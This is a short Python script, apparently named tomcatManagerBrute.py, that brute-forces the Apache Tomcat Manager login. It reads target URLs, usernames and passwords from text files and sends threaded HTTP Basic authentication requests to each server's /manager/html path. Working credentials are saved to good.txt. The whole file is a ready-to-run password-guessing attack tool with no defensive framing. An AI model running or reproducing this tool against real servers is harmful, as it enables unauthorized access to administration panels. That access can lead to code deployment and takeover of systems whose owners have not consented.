#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import requests
import queue
import base64
import threading

u = queue.Queue()
p = queue.Queue()
n = queue.Queue()


def title():
    print('+-------------------------------------------------------+')
    print("+----------------TOOLS_Des: taamr-----------------------+")
    print('+-------Use :python3 tomcatManagerBrute.py--------------+')
    print('+-------------------------------------------------------+')


def urllist():
    urls = open('url.txt', 'r')
    for url in urls:
        url = url.rstrip()
        u.put(url)


def namelist():
    names = open('username.txt', 'r')
    for name in names:
        name = name.rstrip()
        n.put(name)


def passlist():
    passwds = open('password.txt', 'r')
    for passwd in passwds:
        passwd = passwd.rstrip()
        p.put(passwd)


def weakpass(url):
    namelist()
    while not n.empty():
        passlist()
        name = n.get()
        while not p.empty():
            passwd = p.get()
            payload = name + ":" + passwd
            payload_BYTE = payload.encode("UTF-8")
            paylaodbase64 = base64.b64encode(payload_BYTE)
            paylaodbase64 = paylaodbase64.decode("UTF-8")
            headers = {'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, "
                                     "like Gecko) ",
                       'Content-Type': 'application/x-www-form-urlencoded',
                       'Connection': 'close',
                       'Authorization': "Basic " + str(paylaodbase64) + ""}
            try:
                r = requests.get(url, headers=headers, timeout=3)
                if r.status_code == 200:
                    print("[true]" + str(url) + "   " + str(name) + " : " + str(passwd) + "")
                    f = open('good.txt', 'a+')
                    f.write(url + ' ' + str(name) + ': ' + str(passwd) + '\n')
                    f.close()
                else:
                    print("[false]" + str(url) + " " + str(name) + " : " + str(passwd) + "")
            except:
                print("[false]" + str(url) + " " + str(name) + " : " + str(passwd) + "")


def run():
    urllist()
    thr = []
    while not u.empty():
        urls = u.get()
        urls = urls + '/manager/html'
        t = threading.Thread(target=weakpass, args=(urls,))
        thr.append(t)
    for i in thr:
        i.setDaemon(True)
        i.start()
    for j in thr:
        j.join()


if __name__ == "__main__":
    title()
    run()
